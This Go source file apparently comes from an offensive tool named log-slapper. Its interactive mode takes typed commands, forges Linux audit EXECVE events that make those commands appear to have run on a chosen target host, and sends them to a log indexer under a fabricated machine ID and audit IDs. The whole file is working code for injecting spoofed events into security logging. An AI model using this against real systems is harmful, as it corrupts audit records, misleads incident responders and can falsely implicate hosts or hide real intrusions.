package command

import (
	"fmt"
	"math/rand"
	"strings"
	"time"

	"github.com/oz9un/log-slapper/pkg/attacks"
	"github.com/oz9un/log-slapper/pkg/initialize"
	"github.com/pterm/pterm"
)

func RawPlayzone(header bool) {
	if header {
		newHeader := pterm.HeaderPrinter{
			TextStyle:       pterm.NewStyle(pterm.FgBlack),
			BackgroundStyle: pterm.NewStyle(pterm.BgRed),
			Margin:          20,
		}

		fmt.Print("\033[H\033[2J") // clear the terminal
		newHeader.WithFullWidth().Println("--TARGET SHELL PLAYZONE--")
		pterm.Info.Println("Enter commands to make them look they are executed on the target system. Type \"exit()\" to return to the main menu.")
	}

	// Pre-settings with default values
	defaults := map[string]string{
		//"target indexer ip":   "10.10.10.10",
		//"target indexer port": "9997",
		"target hostname": "lin-poc-01",
		"target ip":       "192.168.1.100",
		"index":           "main",
		"source":          "/var/log/audit/audit.log",
		"sourcetype":      "linux:audit",
	}

	// Ordered keys
	order := []string{
		"target hostname",
		"target ip",
		"index",
		"source",
		"sourcetype",
	}

	settings := make(map[string]string)

	fmt.Println()
	pterm.FgYellow.Println("Enter the following details about the target:")

	// Iterating according to the defined order
	for _, key := range order {
		defaultValue := defaults[key]
		input, _ := pterm.DefaultInteractiveTextInput.WithTextStyle(pterm.FgLightRed.ToStyle()).WithDefaultValue(defaultValue).Show("→ " + key)
		settings[key] = input
	}

	// Confirmation before proceeding
	newPrefix := pterm.Prefix{Text: "↓", Style: pterm.NewStyle(pterm.BgLightYellow, pterm.FgRed)}
	fmt.Println()
	pterm.Info.WithPrefix(newPrefix).Println("Settings:")
	for _, key := range order {
		pterm.Println(key + ": " + pterm.LightMagenta(settings[key]))
	}

	confirm, _ := pterm.DefaultInteractiveConfirm.Show("Are these settings correct?")
	if !confirm {
		pterm.Warning.Println("Restarting setup...")
		RawPlayzone(false) // Restart the setup if the user is not satisfied
		return
	}
	fmt.Println()

	// get eXtra fields:
	extraFields := map[string]string{

		"host_ip":    settings["target ip"],
		"machine_id": initialize.GenerateNewMachineID(),
	}

	// set event string template:
	var auditEventIDCounter = rand.Int63n(100000) + 41080000

	// Here you would start taking commands from the user one by one
	// This is a placeholder for your command-taking logic

	_, targetUrl := initialize.ProcessSettingsFile()

	for {
		command, _ := pterm.DefaultInteractiveTextInput.Show("Enter command")
		command = strings.TrimSpace(command)
		if command == "exit()" {
			pterm.Info.Println("Exiting Target Shell Mode...")
			break
		}
		if command == "" {
			//pterm.Warning.Println("No command entered, please try again.")
			continue
		}

		auditEventIDCounter++
		eventTime := time.Now().Unix()
		eventString := GenerateExecveEventString(command, eventTime, auditEventIDCounter)

		attacks.RawEventSender(targetUrl, settings["index"], settings["source"], settings["sourcetype"], settings["target hostname"], eventTime, eventString, extraFields)
	}
}

func GenerateExecveEventString(command string, eventTime int64, auditId int64) string {
	args := strings.Fields(command) // Split the command into arguments based on whitespace
	argc := len(args)               // Count the number of arguments

	// Construct the basic EXECVE event string with the provided time and argument count
	eventString := fmt.Sprintf("type=EXECVE msg=audit(%d.000:%d): argc=%d", eventTime, auditId, argc)

	// Append each argument to the event string
	for i, arg := range args {
		eventString += fmt.Sprintf(" a%d=\"%s\"", i, arg)
	}

	return eventString
}
